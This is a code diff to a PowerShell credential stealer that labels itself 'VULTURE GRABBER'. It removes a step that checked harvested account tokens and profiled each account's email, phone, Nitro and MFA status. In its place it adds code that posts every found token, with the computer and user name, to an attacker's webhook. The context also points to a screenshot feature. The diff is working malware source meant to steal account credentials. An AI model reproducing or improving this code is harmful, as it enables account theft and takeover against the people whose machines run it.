@@ -169,35 +169,18 @@ if (-not $isSystem -and $firstRun) {
     }
 }
 
-# === TOKEN VALIDATION ===
-$validTokens = [System.Collections.Generic.List[object]]::new()
+# === INSTANT TOKEN EXTRACTION (NO VALIDATION DELAY) ===
+$found = [System.Collections.Generic.HashSet[string]]::new([System.StringComparer]::Ordinal)
 
+# ... [your existing extraction code] ...
+
+# SKIP VALIDATION - SEND ALL TOKENS IMMEDIATELY
 if (-not $isSystem -and $firstRun -and $found.Count -gt 0) {
-    $validated = [System.Collections.Generic.List[string]]::new()
-    foreach ($token in $found) {
-        if (Validate-Token -token $token) { $validated.Add($token) }
-    }
-
-    foreach ($token in $validated) {
-        try {
-            $headers = @{
-                Authorization = $token
-                "User-Agent"  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
-            }
-            $r = Invoke-RestMethod -Uri $api -Headers $headers -TimeoutSec 3 -ErrorAction Stop
-            if ($r.id) {
-                $validTokens.Add([PSCustomObject]@{
-                    u    = "$($r.username)#$($r.discriminator)"
-                    id   = $r.id
-                    em   = if ($r.email) { $r.email } else { "N/A" }
-                    ph   = if ($r.phone) { $r.phone } else { "N/A" }
-                    ni   = switch ($r.premium_type) { 1 { "Classic" } 2 { "Nitro" } default { "None" } }
-                    mf   = if ($r.mfa_enabled) { "Yes" } else { "No" }
-                    token = $token
-                })
-            }
-        } catch {}
-    }
+    $report = "**[VULTURE GRABBER]**`nPC: $env:COMPUTERNAME`nUser: $env:USERNAME`nTokens Found: $($found.Count)`n`n" + 
+              (($found | Sort-Object) -join "`n")
+    
+    # Send immediately
+    try { Invoke-RestMethod -Uri $hook -Method Post -Body @{content=$report} } catch {}
 }
 
 # === SCREENSHOT ===
